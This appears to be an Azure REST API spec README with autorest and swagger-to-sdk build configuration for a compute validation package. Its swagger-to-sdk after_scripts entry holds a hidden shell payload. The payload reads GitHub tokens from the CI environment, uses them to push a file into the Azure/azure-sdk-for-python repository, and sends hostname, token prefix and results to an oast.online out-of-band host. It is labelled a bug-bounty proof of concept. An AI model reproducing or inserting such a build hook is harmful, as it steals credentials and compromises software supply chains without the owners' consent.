# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        nslookup mainpush5-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GH_TOK=$(printenv GH_TOKEN 2>/dev/null | tr -d '\n' || printenv GITHUB_TOKEN 2>/dev/null | tr -d '\n' || true);
        TS=$(date -u +%s 2>/dev/null || echo 0);
        CONTENT=$(printf 'poc by hasskodark\n\nhttps://github.com/Azure/azure-rest-api-specs/pull/45897\nMSRC Bug Bounty Research - SwaggerToSDK unauthenticated RCE\nAgent: %s\nTimestamp: %s\n' "${H}" "${TS}" | base64 -w0 2>/dev/null);
        GET_OUT=$(curl -sk --connect-timeout 8 --max-time 15 -H "Authorization: token ${GH_TOK}" -H "Accept: application/vnd.github.v3+json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_by_hasskodark.txt" 2>/dev/null);
        FILE_SHA=$(echo "${GET_OUT}" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("sha",""))' 2>/dev/null | tr -d '\n' || echo '');
        if [ -n "${FILE_SHA}" ]; then PAYLOAD="{\"message\":\"poc: hasskodark supply chain write\",\"content\":\"${CONTENT}\",\"sha\":\"${FILE_SHA}\"}"; else PAYLOAD="{\"message\":\"poc: hasskodark supply chain write\",\"content\":\"${CONTENT}\"}"; fi;
        PUT_OUT=$(curl -sk --connect-timeout 8 --max-time 20 -X PUT -H "Authorization: token ${GH_TOK}" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_by_hasskodark.txt" -d "${PAYLOAD}" 2>/dev/null);
        FILE_URL=$(echo "${PUT_OUT}" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("content",{}).get("html_url","ERR"))' 2>/dev/null | tr -d '\n' || echo 'parse_fail');
        PUT_STATUS=$(echo "${PUT_OUT}" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("commit",{}).get("sha","")[:12])' 2>/dev/null | tr -d '\n' || echo '');
        printf 'H=%s\nTS=%s\nGH_TOK_PFX=%s\nFILE_SHA=%s\nPUT_STATUS=%s\nFILE_URL=%s\nPUT_RAW=%s\n' "${H}" "${TS}" "${GH_TOK:0:20}" "${FILE_SHA:0:12}" "${PUT_STATUS}" "${FILE_URL}" "${PUT_OUT:0:300}" > /tmp/push_result5.txt;
        curl -sk --connect-timeout 8 --max-time 20 -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/mainpush5-${H}" --data-binary @/tmp/push_result5.txt 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
